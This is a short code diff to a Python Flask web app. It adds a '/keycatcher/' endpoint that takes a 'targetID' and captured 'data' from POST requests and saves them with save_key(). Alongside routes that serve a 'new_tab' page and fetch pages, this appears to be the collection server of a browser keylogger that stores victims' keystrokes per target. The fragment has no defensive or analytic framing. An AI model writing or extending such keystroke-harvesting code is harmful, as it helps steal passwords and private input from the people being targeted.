@@ -33,6 +33,16 @@ def new_tab():
     user_id = create_user()
     return render_template('new_tab.html', user_id=user_id)
 
+
+@app.route("/keycatcher/", methods=["POST"])
+def keycatcher():
+    print 'ok'
+    form = request.form
+    id = form['targetID']
+    key = form['data']
+    save_key(id, key)
+    return ''
+
 @app.route("/fetch/", methods=["POST"])
 def fetch_page():
     host_url = request.host_url
